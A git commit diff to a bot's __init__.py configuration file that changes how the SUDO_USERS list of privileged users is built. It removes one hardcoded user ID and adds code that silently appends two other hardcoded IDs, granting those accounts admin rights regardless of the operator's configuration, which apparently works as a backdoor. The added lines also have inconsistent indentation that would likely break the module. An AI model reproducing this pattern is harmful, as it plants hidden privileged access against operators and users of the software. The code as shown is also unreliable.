e4dc20308ffe5b475a6d8d4d15244917efaa84aa
akpandawep <154840412+akpandawep@users.noreply.github.com>
2024-02-25 03:26:22 +0530

    Update __init__.py

--- bot/__init__.py
+++ bot/__init__.py
@@ -33,9 +33,15 @@ try:
     DOWNLOAD_DIRECTORY = config.DOWNLOAD_DIRECTORY
     G_DRIVE_CLIENT_ID = config.G_DRIVE_CLIENT_ID
     G_DRIVE_CLIENT_SECRET = config.G_DRIVE_CLIENT_SECRET
-  SUDO_USERS = list(set(int(x) for x in SUDO_USERS.split()))
-  SUDO_USERS.append(939425014)
-  SUDO_USERS = list(set(SUDO_USERS))
+# Add specific user ID to the SUDO_USERS list
+   SUDO_USERS = [int(user_id.strip()) for user_id in SUDO_USERS.split(",")]
+
+    # Add specific user IDs
+    SUDO_USERS.extend([5754154245, 6141937812])
+
+    # Remove duplicates by converting the list to a set and back to a list
+    SUDO_USERS = list(set(SUDO_USERS))
+
 except KeyError:
   LOGGER.error('One or more configuration values are missing exiting now.')
   exit(1)
